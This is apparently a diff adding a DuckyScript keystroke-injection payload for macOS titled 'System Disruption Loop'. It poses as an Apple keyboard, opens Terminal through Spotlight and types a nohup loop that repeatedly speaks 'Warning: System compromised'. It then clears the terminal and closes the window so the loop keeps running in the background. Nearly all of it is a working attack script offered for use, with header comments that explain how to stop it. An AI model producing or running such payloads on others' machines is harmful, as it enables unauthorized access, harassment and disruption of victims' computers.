@@ -1,0 +1,34 @@
+REM This script initiates a system disruption loop by 
+REM continuously generating warning messages using the "say" command in macOS.
+REM Will continue to run after the terminal is closed 
+
+
+
+REM To end the loop you need to Kill the PID 
+REM Use the command <ps aux | grep 'sh -c while true; do say "Warning: System compromised. Initiating disruption."; done'>
+REM to find the PID 
+REM Run the command 'Kill PID #' to end the warning message loop.
+
+
+REM Author: Narsty
+REM Title: System Disruption Loop
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Executions
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING nohup sh -c 'while true; do say "Warning: System compromised. Initiating disruption."; done' >/dev/null 2>&1 &
+DELAY 500
+GUI k
+DELAY 500
+GUI w
+DELAY 500 
+ENTER 
+
